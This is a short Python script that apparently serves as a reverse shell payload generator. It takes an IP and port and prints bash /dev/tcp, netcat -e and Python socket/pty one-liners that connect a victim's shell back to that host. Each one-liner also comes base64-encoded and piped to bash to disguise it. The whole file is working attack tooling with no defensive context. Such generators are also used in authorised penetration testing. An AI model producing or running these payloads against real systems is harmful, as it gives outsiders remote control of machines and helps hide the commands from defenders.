#!/usr/bin/env python3
from os import sys
import base64

def banner():
    banner = """
    ,-.                           ,-.  .       . .  
    |  )                         (   ` |       | |  
    |-<  ,-. . , ,-. ;-. ,-. ,-.  `-.  |-. ,-. | |  
    |  \ |-' |/  |-' |   `-. |-' .   ) | | |-' | |  
    '  ' `-' '   `-' '   `-' `-'  `-'  ' ' `-' ' '   
    ,-.                     .              ,-.   , 
    /                        |             /  /\ '| 
    | -. ,-. ;-. ,-. ;-. ,-: |-  ,-. ;-.   | / |  | 
    \  | |-' | | |-' |   | | |   | | |     \/  /  | 
     `-' `-' ' ' `-' '   `-` `-' `-' '      `-'   ' 
    """
    print(banner)


def getParams():
    try:
        ip = sys.argv[1]
        port = sys.argv[2]
        return ip, port
    except IndexError:
        print('usage {} ip port'.format(sys.argv[0]))
        sys.exit(-1)
ip, port = getParams()

def base64Encode(data):
    
    return str(base64.b64encode(data.encode()))[2:-1]

def printList():
    print("""  
    Available Payload 

    [1] bash                                               
    [2] nc                                                 
    [3] python            
      """)


def choice():
    try:
        payload = int(input("Select > "))
        if payload == 1 or payload == 2 or payload == 3:
            return payload
        else:
            print("\nWrong payload!")
            return choice()
        
    except ValueError:
        print('\n[-] payload must be an integer')
        sys.exit(-1)



def generate(ip, port, payload):
    bash = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
    nc = "nc {} {} -e /bin/bash".format(ip, port)
    python = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(ip, port)
    print('\n[+] creating reverse shell to {} using port {}'.format(ip, port))
    print('[+] Success!\n')
    
    if payload == 1:
        print(bash)
        print("Base64 encoded payload : echo {} | base64 -d | bash".format(base64Encode(bash)))
    elif payload == 2:
        print(nc)
        print("Base64 encoded payload : echo {} | base64 -d | bash".format(base64Encode(nc)))
    elif payload == 3:
        print(python)
        print("Base64 encoded payload : echo {} | base64 -d | bash".format(base64Encode(python)))

banner()
printList()
payload = choice()
generate(ip, port, payload)
